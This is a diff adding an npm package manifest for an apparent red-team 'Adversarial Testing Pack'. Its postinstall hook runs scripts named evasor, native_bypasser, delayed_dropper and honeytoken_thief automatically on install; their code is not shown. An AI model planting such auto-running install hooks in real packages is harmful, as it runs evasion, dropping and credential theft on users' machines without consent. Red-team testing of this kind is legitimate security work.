@@ -1,0 +1,10 @@
+{
+  "name": "adversarial-pack",
+  "version": "1.0.0",
+  "description": "Sentinel Adversarial Testing Pack",
+  "scripts": {
+    "postinstall": "node evasor.js && node native_bypasser.js && node delayed_dropper.js && node honeytoken_thief.js"
+  },
+  "author": "Sentinel Red Team",
+  "license": "ISC"
+}
